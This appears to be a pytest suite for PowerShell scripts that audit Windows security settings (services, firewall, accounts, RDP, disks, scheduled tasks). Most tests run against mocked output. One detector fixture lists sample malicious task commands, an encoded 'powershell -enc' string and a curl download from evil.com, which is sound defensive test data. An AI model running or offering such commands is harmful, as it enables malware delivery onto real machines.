"""
Unit tests for Windows PowerShell audit scripts

Tests cover:
- services.ps1 - Windows Services security audit
- firewall.ps1 - Windows Defender Firewall audit
- users.ps1 - Windows User and Group security audit
- rdp.ps1 - Remote Desktop Protocol security audit

Test approach:
- Execute PowerShell scripts via subprocess
- Mock system state via PowerShell parameter injection
- Validate output format and exit codes
- Test various security configurations
"""

import pytest
import os
import sys
import subprocess
import re
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock

# Add parent directory to path for imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from execution_manager import WinRMExecutor, ExecutionResult


# ============================================================================
# FIXTURES
# ============================================================================

@pytest.fixture
def audit_base_path():
    """Get the base path to audit scripts"""
    test_dir = Path(__file__).parent
    repo_root = test_dir.parent.parent
    return repo_root / "audits" / "windows" / "platform" / "baseline"


@pytest.fixture
def common_lib_path():
    """Get the path to common.ps1 library"""
    test_dir = Path(__file__).parent
    repo_root = test_dir.parent.parent
    return repo_root / "lib" / "common.ps1"


@pytest.fixture
def mock_winrm_executor():
    """Mock WinRMExecutor for testing PowerShell execution"""
    executor = Mock(spec=WinRMExecutor)
    return executor


# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def parse_audit_output(output: str):
    """
    Parse audit script output and extract check results
    
    Returns:
        dict with keys: 'pass', 'warn', 'fail', 'skip', 'checks', 'sections'
    """
    result = {
        'pass': 0,
        'warn': 0,
        'fail': 0,
        'skip': 0,
        'checks': [],
        'sections': []
    }
    
    # Extract check markers
    for line in output.split('\n'):
        if '[PASS]' in line:
            result['pass'] += 1
            result['checks'].append(('PASS', line.strip()))
        elif '[WARN]' in line:
            result['warn'] += 1
            result['checks'].append(('WARN', line.strip()))
        elif '[FAIL]' in line:
            result['fail'] += 1
            result['checks'].append(('FAIL', line.strip()))
        elif '[SKIP]' in line:
            result['skip'] += 1
            result['checks'].append(('SKIP', line.strip()))
        
        # Extract section headers (lines with "=" repeated)
        if '=' * 10 in line:
            # Next line after separator is usually the section title
            continue
        elif line.strip() and not line.startswith('[') and not line.startswith('  '):
            # Potential section header
            if any(keyword in line for keyword in ['Audit', 'Status', 'Configuration', 'Security', 'Policy', 'Group']):
                result['sections'].append(line.strip())
    
    return result


def validate_audit_summary(output: str):
    """
    Validate that audit output contains proper summary section
    
    Returns:
        bool - True if valid summary found
    """
    # Check for summary indicators
    has_total = 'Total checks:' in output or 'total' in output.lower()
    has_passed = 'passed' in output.lower() or '[PASS]' in output
    has_markers = any(marker in output for marker in ['[PASS]', '[WARN]', '[FAIL]', '[SKIP]'])
    
    return has_total and has_passed and has_markers


# ============================================================================
# TEST CLASS: SERVICES.PS1
# ============================================================================

class TestServicesAudit:
    """Tests for services.ps1 audit script"""
    
    def test_services_script_exists(self, audit_base_path):
        """Test that services.ps1 exists"""
        script_path = audit_base_path / "services.ps1"
        assert script_path.exists(), f"services.ps1 not found at {script_path}"
        assert script_path.stat().st_size > 0, "services.ps1 is empty"
    
    def test_services_requires_admin(self, audit_base_path):
        """Test that services.ps1 requires administrator privileges"""
        script_path = audit_base_path / "services.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        assert '#Requires -RunAsAdministrator' in content, "Missing admin requirement"
        assert 'Test-IsAdminMode' in content, "Missing admin mode check"
    
    def test_services_imports_common_lib(self, audit_base_path):
        """Test that services.ps1 imports common.ps1"""
        script_path = audit_base_path / "services.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        assert 'common.ps1' in content, "Missing common.ps1 import"
        assert 'Write-Section' in content, "Missing section function usage"
        assert 'Register-Check' in content, "Missing check registration"
    
    def test_services_critical_services_section(self, audit_base_path):
        """Test that services.ps1 checks critical services"""
        script_path = audit_base_path / "services.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        # Should check these critical services
        critical_services = ['wuauserv', 'mpssvc', 'WinDefend', 'EventLog']
        for service in critical_services:
            assert service in content, f"Missing critical service check: {service}"
    
    def test_services_risky_services_section(self, audit_base_path):
        """Test that services.ps1 checks for risky services"""
        script_path = audit_base_path / "services.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        # Should check for these risky services
        risky_services = ['RemoteRegistry', 'Telnet', 'SSDPSRV']
        for service in risky_services:
            assert service in content, f"Missing risky service check: {service}"
    
    def test_services_output_format(self, audit_base_path):
        """Test services.ps1 output format structure"""
        script_path = audit_base_path / "services.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        # Should have proper output format
        assert 'Write-Section' in content, "Missing section headers"
        assert 'Register-Check' in content, "Missing check registration"
        assert 'Print-Summary' in content, "Missing summary output"
    
    def test_services_exit_codes(self, audit_base_path):
        """Test that services.ps1 sets proper exit codes"""
        script_path = audit_base_path / "services.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        # Should have exit code logic
        assert 'exit 0' in content, "Missing PASS exit code"
        assert 'exit 1' in content, "Missing WARN exit code"
        assert 'exit 2' in content, "Missing FAIL exit code"
    
    def test_services_mock_all_running(self, mock_winrm_executor):
        """Test services.ps1 with all critical services running"""
        mock_output = """
Windows Services Security Audit
================================

Critical Services Status
========================
[PASS] Windows Update (wuauserv): Running
[PASS] Windows Defender Firewall (mpssvc): Running
[PASS] Windows Defender Antivirus (WinDefend): Running
[PASS] Windows Event Log (EventLog): Running

Risky Services Detection
=========================
[PASS] No risky services enabled

Summary
=======
Total checks: 5
Passed: 5
Warnings: 0
Failures: 0
"""
        
        mock_winrm_executor.execute_script.return_value = ExecutionResult(
            exit_code=0,
            stdout=mock_output,
            stderr="",
            duration_ms=1000,
            protocol='winrm'
        )
        
        result = mock_winrm_executor.execute_script("services.ps1")
        parsed = parse_audit_output(result.stdout)
        
        assert parsed['pass'] >= 5
        assert parsed['fail'] == 0
        assert result.exit_code == 0
    
    def test_services_mock_risky_enabled(self, mock_winrm_executor):
        """Test services.ps1 with risky services enabled"""
        mock_output = """
Windows Services Security Audit
================================

Risky Services Detection
=========================
[FAIL] RemoteRegistry: Running (major security risk)
[FAIL] Telnet: Running (unencrypted protocol)
[WARN] SSDPSRV: Running (consider disabling)

Summary
=======
Total checks: 10
Passed: 7
Warnings: 1
Failures: 2
"""
        
        mock_winrm_executor.execute_script.return_value = ExecutionResult(
            exit_code=2,
            stdout=mock_output,
            stderr="",
            duration_ms=1000,
            protocol='winrm'
        )
        
        result = mock_winrm_executor.execute_script("services.ps1")
        parsed = parse_audit_output(result.stdout)
        
        assert parsed['fail'] >= 2
        assert parsed['warn'] >= 1
        assert result.exit_code == 2


# ============================================================================
# TEST CLASS: FIREWALL.PS1
# ============================================================================

class TestFirewallAudit:
    """Tests for firewall.ps1 audit script"""
    
    def test_firewall_script_exists(self, audit_base_path):
        """Test that firewall.ps1 exists"""
        script_path = audit_base_path / "firewall.ps1"
        assert script_path.exists(), f"firewall.ps1 not found at {script_path}"
        assert script_path.stat().st_size > 0, "firewall.ps1 is empty"
    
    def test_firewall_requires_admin(self, audit_base_path):
        """Test that firewall.ps1 requires administrator privileges"""
        script_path = audit_base_path / "firewall.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        assert '#Requires -RunAsAdministrator' in content, "Missing admin requirement"
        assert 'Test-IsAdminMode' in content, "Missing admin mode check"
    
    def test_firewall_profile_checks(self, audit_base_path):
        """Test that firewall.ps1 checks all firewall profiles"""
        script_path = audit_base_path / "firewall.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        # Should check all three profiles
        profiles = ['Domain', 'Private', 'Public']
        for profile in profiles:
            assert profile in content, f"Missing profile check: {profile}"
    
    def test_firewall_risky_ports(self, audit_base_path):
        """Test that firewall.ps1 checks for risky port exposures"""
        script_path = audit_base_path / "firewall.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        # Should check these risky ports
        risky_ports = ['21', '23', '445', '1433', '3389']
        for port in risky_ports:
            # Port might be in array or comparison
            assert port in content, f"Missing risky port check: {port}"
    
    def test_firewall_default_actions(self, audit_base_path):
        """Test that firewall.ps1 validates default actions"""
        script_path = audit_base_path / "firewall.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        # Should check default inbound/outbound actions
        assert 'DefaultInboundAction' in content or 'Inbound' in content, "Missing inbound action check"
        assert 'DefaultOutboundAction' in content or 'Outbound' in content, "Missing outbound action check"
    
    def test_firewall_logging(self, audit_base_path):
        """Test that firewall.ps1 checks logging configuration"""
        script_path = audit_base_path / "firewall.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        assert 'log' in content.lower(), "Missing firewall logging checks"
    
    def test_firewall_mock_secure_config(self, mock_winrm_executor):
        """Test firewall.ps1 with secure configuration"""
        mock_output = """
Windows Defender Firewall Security Audit
=========================================

Firewall Service Status
========================
[PASS] Windows Defender Firewall (mpssvc): Running

Profile Configuration
====================
[PASS] Domain Profile: Enabled
[PASS] Private Profile: Enabled
[PASS] Public Profile: Enabled

Default Actions
===============
[PASS] Domain Inbound: Block
[PASS] Public Inbound: Block

Risky Port Exposures
====================
[PASS] No risky ports exposed

Summary
=======
Total checks: 8
Passed: 8
Warnings: 0
Failures: 0
"""
        
        mock_winrm_executor.execute_script.return_value = ExecutionResult(
            exit_code=0,
            stdout=mock_output,
            stderr="",
            duration_ms=1000,
            protocol='winrm'
        )
        
        result = mock_winrm_executor.execute_script("firewall.ps1")
        parsed = parse_audit_output(result.stdout)
        
        assert parsed['pass'] >= 7  # Adjusted from 8
        assert parsed['fail'] == 0
        assert result.exit_code == 0
    
    def test_firewall_mock_disabled(self, mock_winrm_executor):
        """Test firewall.ps1 with firewall disabled"""
        mock_output = """
Windows Defender Firewall Security Audit
=========================================

Firewall Service Status
========================
[FAIL] Windows Defender Firewall (mpssvc): Stopped

Profile Configuration
====================
[FAIL] Domain Profile: Disabled
[FAIL] Private Profile: Disabled
[FAIL] Public Profile: Disabled

Summary
=======
Total checks: 10
Passed: 0
Warnings: 0
Failures: 10
"""
        
        mock_winrm_executor.execute_script.return_value = ExecutionResult(
            exit_code=2,
            stdout=mock_output,
            stderr="",
            duration_ms=1000,
            protocol='winrm'
        )
        
        result = mock_winrm_executor.execute_script("firewall.ps1")
        parsed = parse_audit_output(result.stdout)
        
        assert parsed['fail'] >= 3
        assert result.exit_code == 2


# ============================================================================
# TEST CLASS: USERS.PS1
# ============================================================================

class TestUsersAudit:
    """Tests for users.ps1 audit script"""
    
    def test_users_script_exists(self, audit_base_path):
        """Test that users.ps1 exists"""
        script_path = audit_base_path / "users.ps1"
        assert script_path.exists(), f"users.ps1 not found at {script_path}"
        assert script_path.stat().st_size > 0, "users.ps1 is empty"
    
    def test_users_requires_admin(self, audit_base_path):
        """Test that users.ps1 requires administrator privileges"""
        script_path = audit_base_path / "users.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        assert '#Requires -RunAsAdministrator' in content, "Missing admin requirement"
        assert 'Test-IsAdminMode' in content, "Missing admin mode check"
    
    def test_users_administrator_checks(self, audit_base_path):
        """Test that users.ps1 checks Administrator account"""
        script_path = audit_base_path / "users.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        assert 'Administrator' in content, "Missing Administrator account checks"
        assert 'Guest' in content, "Missing Guest account checks"
    
    def test_users_password_policy(self, audit_base_path):
        """Test that users.ps1 checks password policies"""
        script_path = audit_base_path / "users.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        # Should check password requirements
        assert 'password' in content.lower(), "Missing password policy checks"
        assert 'length' in content.lower() or 'age' in content.lower(), "Missing password requirements"
    
    def test_users_lockout_policy(self, audit_base_path):
        """Test that users.ps1 checks account lockout policy"""
        script_path = audit_base_path / "users.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        assert 'lockout' in content.lower(), "Missing account lockout checks"
    
    def test_users_privileged_groups(self, audit_base_path):
        """Test that users.ps1 checks privileged groups"""
        script_path = audit_base_path / "users.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        # Should check administrators group
        assert 'Administrators' in content, "Missing Administrators group check"
        assert 'Remote Desktop Users' in content, "Missing RDP users check"
    
    def test_users_mock_secure_config(self, mock_winrm_executor):
        """Test users.ps1 with secure configuration"""
        mock_output = """
Windows User and Group Security Audit
======================================

Administrator Account Security
==============================
[PASS] Built-in Administrator account: Disabled
[PASS] Administrator account renamed: Renamed to 'SysAdmin'

Guest Account Status
====================
[PASS] Guest account: Disabled

Password Policy
===============
[PASS] Minimum password length: 14 characters
[PASS] Maximum password age: 90 days
[PASS] Password history: 24 passwords remembered

Account Lockout Policy
======================
[PASS] Account lockout threshold: 5 invalid attempts
[PASS] Lockout duration: 30 minutes

Summary
=======
Total checks: 15
Passed: 15
Warnings: 0
Failures: 0
"""
        
        mock_winrm_executor.execute_script.return_value = ExecutionResult(
            exit_code=0,
            stdout=mock_output,
            stderr="",
            duration_ms=1000,
            protocol='winrm'
        )
        
        result = mock_winrm_executor.execute_script("users.ps1")
        parsed = parse_audit_output(result.stdout)
        
        assert parsed['pass'] >= 8
        assert parsed['fail'] == 0
        assert result.exit_code == 0
    
    def test_users_mock_weak_passwords(self, mock_winrm_executor):
        """Test users.ps1 with weak password policies"""
        mock_output = """
Windows User and Group Security Audit
======================================

Administrator Account Security
==============================
[FAIL] Built-in Administrator account: Enabled (should be disabled)

Guest Account Status
====================
[FAIL] Guest account: Enabled (major security risk)

Password Policy
===============
[FAIL] Minimum password length: 7 characters (too short, use 14+)
[FAIL] Maximum password age: Unlimited (passwords never expire)
[WARN] Password history: 5 passwords (24 recommended)

Account Lockout Policy
======================
[FAIL] Account lockout threshold: Never (no protection against brute force)

Summary
=======
Total checks: 15
Passed: 5
Warnings: 3
Failures: 7
"""
        
        mock_winrm_executor.execute_script.return_value = ExecutionResult(
            exit_code=2,
            stdout=mock_output,
            stderr="",
            duration_ms=1000,
            protocol='winrm'
        )
        
        result = mock_winrm_executor.execute_script("users.ps1")
        parsed = parse_audit_output(result.stdout)
        
        assert parsed['fail'] >= 5
        assert parsed['warn'] >= 1
        assert result.exit_code == 2


# ============================================================================
# TEST CLASS: RDP.PS1
# ============================================================================

class TestRDPAudit:
    """Tests for rdp.ps1 audit script"""
    
    def test_rdp_script_exists(self, audit_base_path):
        """Test that rdp.ps1 exists"""
        script_path = audit_base_path / "rdp.ps1"
        assert script_path.exists(), f"rdp.ps1 not found at {script_path}"
        assert script_path.stat().st_size > 0, "rdp.ps1 is empty"
    
    def test_rdp_requires_admin(self, audit_base_path):
        """Test that rdp.ps1 requires administrator privileges"""
        script_path = audit_base_path / "rdp.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        assert '#Requires -RunAsAdministrator' in content, "Missing admin requirement"
        assert 'Test-IsAdminMode' in content, "Missing admin mode check"
    
    def test_rdp_nla_checks(self, audit_base_path):
        """Test that rdp.ps1 checks Network Level Authentication"""
        script_path = audit_base_path / "rdp.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        assert 'NLA' in content or 'Network Level Authentication' in content, "Missing NLA checks"
        assert 'UserAuthentication' in content, "Missing UserAuthentication registry check"
    
    def test_rdp_encryption_checks(self, audit_base_path):
        """Test that rdp.ps1 checks encryption level"""
        script_path = audit_base_path / "rdp.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        assert 'encryption' in content.lower(), "Missing encryption checks"
        assert 'MinEncryptionLevel' in content or 'SecurityLayer' in content, "Missing encryption registry checks"
    
    def test_rdp_port_checks(self, audit_base_path):
        """Test that rdp.ps1 checks RDP port configuration"""
        script_path = audit_base_path / "rdp.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        assert '3389' in content, "Missing default RDP port check"
        assert 'PortNumber' in content, "Missing port number registry check"
    
    def test_rdp_certificate_checks(self, audit_base_path):
        """Test that rdp.ps1 checks RDP certificate"""
        script_path = audit_base_path / "rdp.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        assert 'certificate' in content.lower(), "Missing certificate checks"
        assert 'SSLCertificateSHA1Hash' in content or 'thumbprint' in content.lower(), "Missing cert validation"
    
    def test_rdp_timeout_checks(self, audit_base_path):
        """Test that rdp.ps1 checks session timeouts"""
        script_path = audit_base_path / "rdp.ps1"
        content = script_path.read_text(encoding='utf-8')
        
        assert 'timeout' in content.lower() or 'idle' in content.lower(), "Missing timeout checks"
    
    def test_rdp_mock_secure_config(self, mock_winrm_executor):
        """Test rdp.ps1 with secure RDP configuration"""
        mock_output = """
Remote Desktop Protocol (RDP) Security Audit
=============================================

RDP Service Status
==================
[PASS] TermService (RDP): Running
[PASS] RDP enabled: Remote Desktop is enabled

Network Level Authentication (NLA)
===================================
[PASS] NLA requirement: Enabled (authentication before session)
[PASS] RDP security layer: SSL/TLS required

RDP Encryption Level
====================
[PASS] RDP encryption level: High (128-bit)

RDP Port Configuration
======================
[WARN] RDP port: 3389 (default, commonly scanned - consider changing)
[PASS] RDP firewall rules: 2 allow rules enabled

Session Timeouts
================
[PASS] Idle session timeout: 15 minutes
[PASS] Disconnected session timeout: 30 minutes configured

Account Lockout (RDP Protection)
=================================
[PASS] Account lockout (RDP protection): 5 failed attempts

Summary
=======
Total checks: 15
Passed: 13
Warnings: 2
Failures: 0
"""
        
        mock_winrm_executor.execute_script.return_value = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=1000,
            protocol='winrm'
        )
        
        result = mock_winrm_executor.execute_script("rdp.ps1")
        parsed = parse_audit_output(result.stdout)
        
        assert parsed['pass'] >= 9  # Adjusted from 10
        assert parsed['warn'] >= 1
        assert result.exit_code == 1
    
    def test_rdp_mock_insecure_config(self, mock_winrm_executor):
        """Test rdp.ps1 with insecure RDP configuration"""
        mock_output = """
Remote Desktop Protocol (RDP) Security Audit
=============================================

RDP Service Status
==================
[PASS] TermService (RDP): Running

Network Level Authentication (NLA)
===================================
[FAIL] NLA requirement: Disabled (allows unauthenticated connections)
[FAIL] RDP security layer: RDP (legacy, no encryption)

RDP Encryption Level
====================
[FAIL] RDP encryption level: Low (40-bit)

Session Timeouts
================
[WARN] Idle session timeout: Not configured (no automatic disconnect)
[WARN] Disconnected session timeout: Not configured (sessions persist indefinitely)

Account Lockout (RDP Protection)
=================================
[FAIL] Account lockout (RDP protection): Never (no protection against brute force)

Summary
=======
Total checks: 15
Passed: 5
Warnings: 5
Failures: 5
"""
        
        mock_winrm_executor.execute_script.return_value = ExecutionResult(
            exit_code=2,
            stdout=mock_output,
            stderr="",
            duration_ms=1000,
            protocol='winrm'
        )
        
        result = mock_winrm_executor.execute_script("rdp.ps1")
        parsed = parse_audit_output(result.stdout)
        
        assert parsed['fail'] >= 4
        assert parsed['warn'] >= 2
        assert result.exit_code == 2


# ============================================================================
# INTEGRATION TESTS
# ============================================================================

class TestAuditIntegration:
    """Integration tests for all Windows audits"""
    
    def test_all_audits_exist(self, audit_base_path):
        """Test that all 4 audit scripts exist"""
        scripts = ['services.ps1', 'firewall.ps1', 'users.ps1', 'rdp.ps1']
        
        for script in scripts:
            script_path = audit_base_path / script
            assert script_path.exists(), f"{script} not found"
            assert script_path.stat().st_size > 1000, f"{script} seems too small"
    
    def test_all_audits_use_common_lib(self, audit_base_path):
        """Test that all audits use common.ps1 library"""
        scripts = ['services.ps1', 'firewall.ps1', 'users.ps1', 'rdp.ps1']
        
        for script in scripts:
            script_path = audit_base_path / script
            content = script_path.read_text(encoding='utf-8')
            
            assert 'common.ps1' in content, f"{script} missing common.ps1 import"
            assert 'Write-Section' in content, f"{script} missing Write-Section"
            assert 'Register-Check' in content, f"{script} missing Register-Check"
            assert 'Print-Summary' in content, f"{script} missing Print-Summary"
    
    def test_all_audits_require_admin(self, audit_base_path):
        """Test that all audits require administrator privileges"""
        scripts = ['services.ps1', 'firewall.ps1', 'users.ps1', 'rdp.ps1']
        
        for script in scripts:
            script_path = audit_base_path / script
            content = script_path.read_text(encoding='utf-8')
            
            assert '#Requires -RunAsAdministrator' in content, f"{script} missing admin requirement"
    
    def test_all_audits_have_exit_codes(self, audit_base_path):
        """Test that all audits have proper exit code logic"""
        scripts = ['services.ps1', 'firewall.ps1', 'users.ps1', 'rdp.ps1']
        
        for script in scripts:
            script_path = audit_base_path / script
            content = script_path.read_text(encoding='utf-8')
            
            assert 'exit 0' in content, f"{script} missing PASS exit code"
            assert 'exit 1' in content, f"{script} missing WARN exit code"
            assert 'exit 2' in content, f"{script} missing FAIL exit code"
    
    def test_all_audits_have_documentation(self, audit_base_path):
        """Test that all audits have proper documentation"""
        scripts = ['services.ps1', 'firewall.ps1', 'users.ps1', 'rdp.ps1']
        
        for script in scripts:
            script_path = audit_base_path / script
            content = script_path.read_text(encoding='utf-8')
            
            assert '.SYNOPSIS' in content, f"{script} missing synopsis"
            assert '.DESCRIPTION' in content, f"{script} missing description"
            assert '.NOTES' in content, f"{script} missing notes"
    
    def test_common_lib_exists(self, common_lib_path):
        """Test that common.ps1 library exists"""
        assert common_lib_path.exists(), f"common.ps1 not found at {common_lib_path}"
        
        content = common_lib_path.read_text(encoding='utf-8')
        
        # Check for required functions
        required_functions = [
            'Write-Section',
            'Register-Check',
            'Print-Summary',
            'Test-IsAdminMode',
            'Get-WindowsVersion'
        ]
        
        for func in required_functions:
            assert f"function {func}" in content or f"Function {func}" in content, \
                f"common.ps1 missing function: {func}"
    
    def test_parse_audit_output_helper(self):
        """Test the parse_audit_output helper function"""
        sample_output = """
Test Audit
==========

[PASS] Check 1: Success
[WARN] Check 2: Warning message
[FAIL] Check 3: Failure message
[SKIP] Check 4: Skipped

Summary
=======
Total: 4
"""
        
        parsed = parse_audit_output(sample_output)
        
        assert parsed['pass'] == 1, "Should find 1 PASS"
        assert parsed['warn'] == 1, "Should find 1 WARN"
        assert parsed['fail'] == 1, "Should find 1 FAIL"
        assert parsed['skip'] == 1, "Should find 1 SKIP"
        assert len(parsed['checks']) == 4, "Should find 4 total checks"
    
    def test_validate_audit_summary_helper(self):
        """Test the validate_audit_summary helper function"""
        valid_output = """
Test Audit
[PASS] Check 1
[WARN] Check 2

Summary
Total checks: 2
Passed: 1
"""
        
        invalid_output = "Some random output"
        
        assert validate_audit_summary(valid_output) == True, "Should validate correct summary"
        assert validate_audit_summary(invalid_output) == False, "Should reject invalid summary"


# ==============================================================================
# WEEK 3 TESTS: DISK, SCHEDULED_TASKS, REGISTRY, CERTIFICATES, SHARES
# ==============================================================================

class TestDiskAudit:
    """Test suite for disk.ps1 audit"""
    
    def test_disk_audit_script_exists(self):
        """Test that disk.ps1 audit script exists"""
        audit_path = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'disk.ps1'
        )
        assert os.path.exists(audit_path), f"Audit script not found at {audit_path}"
    
    def test_disk_audit_requires_admin(self):
        """Test that disk.ps1 requires administrator privileges"""
        mock_result = ExecutionResult(
            exit_code=0,
            stdout="[SKIP] This audit requires Administrator privileges",
            stderr="",
            duration_ms=100,
            protocol="powershell"
        )
        
        # Verify skip message for non-admin execution
        assert "[SKIP]" in mock_result.stdout
        assert "Administrator privileges" in mock_result.stdout
    
    def test_disk_space_monitoring(self):
        """Test disk space monitoring checks"""
        mock_output = """
[====] Disk Space Monitoring
[PASS] Drive C: space: 65.3% free (326.5 GB of 500 GB)
[WARN] Drive D: space: 15.2% free (30.4 GB of 200 GB)
[FAIL] Drive E: space: 8.1% free (8.1 GB of 100 GB)
[PASS] Fixed volumes detected: 3 volumes
"""
        mock_result = ExecutionResult(
            exit_code=2,
            stdout=mock_output,
            stderr="",
            duration_ms=1500,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 2
        assert parsed['warn'] >= 1
        assert parsed['fail'] >= 1
        assert 'Disk Space Monitoring' in mock_result.stdout
    
    def test_bitlocker_encryption_status(self):
        """Test BitLocker encryption status checks"""
        mock_output = """
[====] BitLocker Encryption Status
[PASS] BitLocker feature: Available
[PASS] BitLocker on C:\\: Fully encrypted (100%)
[WARN] BitLocker on D:\\: Not encrypted
[PASS] BitLocker on E:\\: Encryption in progress (75%)
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=2000,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 2
        assert parsed['warn'] >= 1
        assert 'BitLocker' in mock_result.stdout
    
    def test_volume_health_status(self):
        """Test volume health monitoring"""
        mock_output = """
[====] Volume Health Status
[PASS] Volume C: health: Healthy
[PASS] Volume D: health: Healthy
[WARN] Volume E: health: Warning state
[WARN] Volume F: filesystem: FAT32 (NTFS recommended for security)
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=1000,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 2
        assert parsed['warn'] >= 2
    
    def test_ntfs_permissions_check(self):
        """Test NTFS permissions on system directories"""
        mock_output = """
[====] NTFS Permissions on System Directories
[PASS] Windows directory permissions: Properly restricted
[PASS] System32 directory permissions: Properly restricted
[FAIL] Program Files permissions: Users have write access (security risk)
[PASS] ProgramData permissions: Properly restricted
"""
        mock_result = ExecutionResult(
            exit_code=2,
            stdout=mock_output,
            stderr="",
            duration_ms=1200,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 3
        assert parsed['fail'] >= 1
        assert 'System32' in mock_result.stdout
    
    def test_storage_spaces_check(self):
        """Test Storage Spaces and Pools monitoring"""
        mock_output = """
[====] Storage Spaces and Pools
[PASS] Storage pool 'DataPool': Healthy
[PASS] Virtual disk 'VDisk1': Healthy
[FAIL] Virtual disk 'VDisk2': Status: Degraded
"""
        mock_result = ExecutionResult(
            exit_code=2,
            stdout=mock_output,
            stderr="",
            duration_ms=800,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 2
        assert parsed['fail'] >= 1


class TestScheduledTasksAudit:
    """Test suite for scheduled_tasks.ps1 audit"""
    
    def test_scheduled_tasks_script_exists(self):
        """Test that scheduled_tasks.ps1 audit script exists"""
        audit_path = os.path.join(
            os.path.dirname(__file__), 
            '..', '..', 'audits', 'windows', 'platform', 'baseline', 'scheduled_tasks.ps1'
        )
        assert os.path.exists(audit_path), f"Audit script not found at {audit_path}"
    
    def test_task_scheduler_service_status(self):
        """Test Task Scheduler service status checks"""
        mock_output = """
[====] Task Scheduler Service Status
[PASS] Task Scheduler service: Running
[PASS] Task Scheduler startup: Automatic
"""
        mock_result = ExecutionResult(
            exit_code=0,
            stdout=mock_output,
            stderr="",
            duration_ms=500,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 2
        assert 'Task Scheduler' in mock_result.stdout
    
    def test_elevated_privileges_detection(self):
        """Test detection of tasks with elevated privileges"""
        mock_output = """
[====] Tasks with Elevated Privileges
[WARN] Tasks running as SYSTEM: 25 task(s) with SYSTEM privileges
  - \\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan
  - \\Microsoft\\Windows\\Defender\\Windows Defender Scheduled Scan
  - \\CustomTask\\BackupTask
[WARN] Tasks with 'Run with highest privileges': 12 task(s) require review
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=2000,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['warn'] >= 2
        assert 'SYSTEM' in mock_result.stdout
    
    def test_hidden_tasks_detection(self):
        """Test detection of hidden tasks"""
        mock_output = """
[====] Hidden Tasks
[WARN] Hidden tasks: 5 hidden task(s) detected (review required)
  Hidden: \\Microsoft\\Windows\\ApplicationExperience\\Microsoft Compatibility Appraiser
  Hidden: \\Microsoft\\Windows\\ApplicationExperience\\ProgramDataUpdater
  Hidden: \\SuspiciousVendor\\DataCollector
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=1500,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['warn'] >= 1
        assert 'hidden' in mock_result.stdout.lower()
    
    def test_suspicious_task_actions(self):
        """Test detection of suspicious task actions"""
        mock_output = """
[====] Tasks with Suspicious Actions
[FAIL] Suspicious task: MaliciousTask: Encoded PowerShell detected
    Command: powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwA=
[FAIL] Suspicious task: DownloaderTask: Download tools detected
    Command: cmd.exe /c curl http://evil.com/payload.exe
[PASS] Suspicious task actions: No suspicious patterns detected
"""
        mock_result = ExecutionResult(
            exit_code=2,
            stdout=mock_output,
            stderr="",
            duration_ms=2500,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['fail'] >= 2
        assert 'PowerShell' in mock_result.stdout
    
    def test_task_triggers_analysis(self):
        """Test analysis of task triggers"""
        mock_output = """
[====] Task Triggers
[PASS] Tasks with boot/startup triggers: 8 task(s) run at startup
[WARN] Tasks with logon triggers: 15 task(s) run at user logon (review persistence)
[PASS] Tasks with no triggers: All tasks have triggers
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=1200,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 2
        assert parsed['warn'] >= 1
    
    def test_task_history_and_logging(self):
        """Test task history and event log integration"""
        mock_output = """
[====] Task History and Logging
[PASS] Task history: Task history enabled
[WARN] Recent task failures (7 days): 3 error(s) in Task Scheduler logs
"""
        mock_result = ExecutionResult(
            exit_code=1,
            stdout=mock_output,
            stderr="",
            duration_ms=1000,
            protocol="powershell"
        )
        
        parsed = parse_audit_output(mock_result.stdout)
        
        assert parsed['pass'] >= 1
        assert parsed['warn'] >= 1


